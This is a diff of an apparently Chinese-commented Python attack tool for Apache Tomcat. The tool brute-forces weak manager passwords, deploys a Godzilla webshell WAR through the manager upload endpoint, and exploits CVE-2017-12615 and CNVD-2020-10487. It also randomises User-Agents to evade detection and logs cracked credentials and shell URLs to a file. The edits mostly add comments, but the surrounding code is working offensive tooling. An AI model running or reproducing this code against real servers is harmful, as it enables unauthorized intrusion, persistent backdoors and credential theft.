@@ -205,19 +205,28 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
             # 使用获取到的 JSESSIONID 和 CSRF_NONCE 进行上传
             deploy_url = f"{url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={csrf_nonce}"
             cookies = {'JSESSIONID': jsessionid}
+
+            # 打开 WAR 文件进行二进制读取
             with open(war_file_path, 'rb') as war_file:
+                # 准备文件字典，包括文件名、文件对象和MIME类型
                 files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
+                # 发送POST请求上传文件
                 response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          files=files, verify=False, timeout=3)
+            # 检查HTTP响应状态
             response.raise_for_status()
             shell_url = f"{url}/{random_string}/{shell_file_name}"
+
+            # 尝试获取Webshell
             shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                           verify=False, timeout=3)
             if shell_response.status_code == 200:
+                # 如果成功获取Webshell，记录相关信息
                 logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                 with open(output_file, 'a', encoding='utf-8') as f:
                     f.write(f"{url} {username}:{password} - Webshell: {shell_url}\n")
             else:
+                # 如果获取Webshell失败，发出警告
                 logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
             break  # 成功后退出循环
         except requests.exceptions.RequestException as e:
@@ -350,7 +359,6 @@ def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, c
     return workers
 
 
-
 def validate_config(config):
     """
     验证配置文件是否包含必要的字段。
@@ -399,7 +407,7 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
         shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')
 
         headers = {
-            "User-Agent": "Mozilla/5.0",
+            "User-Agent": getRandomUserAgent(),
             "Connection": "close",
             "Content-Type": "application/octet-stream"
         }
@@ -488,15 +496,18 @@ def detect_and_check(url, usernames, passwords, output_file, config, proxies):
     - config: 配置信息字典。
     - proxies: 代理设置，格式为 {'http': 'http://10.10.1.10:3128', 'https': 'http://10.10.1.10:1080'}
     """
-    # 先进行CVE-2017-12615检测
+
+    # 检测特定CVE和CNVD漏洞
     success, vuln_type, exploit_url = check_cve_2017_12615_and_cnvd_2020_10487(url, config)
 
+    # 如果漏洞利用成功，则将结果追加到输出文件
     if success:
         target_host = url.split("://")[-1].split("/")[0]
         with open(output_file, 'a', encoding='utf-8') as f:
             f.write(f"{target_host} - {vuln_type} Exploited: {exploit_url}\n")
 
     # 无论漏洞利用成功与否，都进行弱口令检测
+    logger.info(f"{Fore.GREEN}[+] 接下来进行弱口令检测.........")
     check_weak_password(url, usernames, passwords, output_file,
                         config['retry']['check_weak_password']['max_retries'],
                         config['retry']['check_weak_password']['retry_delay'],
